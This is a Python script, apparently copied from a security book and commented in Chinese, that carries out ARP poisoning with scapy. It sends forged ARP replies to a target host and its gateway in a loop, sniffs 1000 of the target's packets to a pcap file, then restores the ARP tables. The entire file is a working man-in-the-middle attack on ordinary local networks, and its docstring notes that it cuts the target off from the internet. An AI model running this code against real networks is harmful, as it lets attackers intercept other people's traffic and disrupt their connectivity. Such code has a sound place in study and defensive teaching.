"""
    书本中的 ARP 投毒， 源代码
    在本机 arp 可以看到目标 Ip 的 mac 地址修改为本地的
    效果：本机 arp -a 命令 看到 网关的mac 与 目标地址的mac 与 本机的mac 相同
    目标主机、本机 无法上网
"""

from scapy.all import *
import os
import sys
import threading
import signal

interface = "WLAN"
target_ip = "192.168.0.106"
gateway_ip = "192.168.0.1"
packet_count = 1000


def main():
    # 设置嗅探的网卡
    conf.iface = interface
    # 关闭输出
    conf.verb = 0
    print("[*] Setting up %s" % interface)

    gateway_mac = get_mac(gateway_ip)

    if gateway_mac is None:
        print("[!!] Failed to get gateway MAC. Exiting.")
        sys.exit(0)
    else:
        print("[*] Gateway %s is at %s" % (gateway_ip, gateway_mac))

    target_mac = get_mac(target_ip)

    if target_mac is None:
        print("[!!] Failed to get Target MAC. Exiting.")
        sys.exit(0)
    else:
        print("[*] Target %s is at %s" % (target_ip, target_mac))

    # 启动ARP投毒线程
    poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
    poison_thread.start()

    try:
        print("[*] Starting sniffer for %d packet" % packet_count)
        bpf_filter = "ip host %s" % target_ip
        packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)

        # 将捕获到的数据包输出到文件
        wrpcap("arper.pcap", packets)

    except Exception as e:
        print(e)

    finally:
        # 还原网络配置
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
        sys.exit(0)


def get_mac(ip_address):
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)
    # 返回从相应数据中获取的MAC地址
    for s, r in responses:
        return r[Ether].src
    return None


def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    # 欺骗目标地址
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    # 欺骗网关地址
    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print("[*] Beginning the ARP poison. [CTRL-C to stop]")

    try:
        while True:
            send(poison_target)
            send(poison_gateway)
            print("已发送两个 arp 包 --------")
            time.sleep(2)
    except Exception as e:
        print(e)
    finally:
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
        print("[*] ARP poison attack finished")


def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    # 以下代码中调用 send 函数的方式稍有不同
    print("[*] Restoring target....")
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)

    # 发送推出信号到主线程
    os.kill(os.getpid(), signal.SIGINT)


if __name__ == '__main__':
    main()

    # result = get_mac("192.168.0.1")
    # print(result)

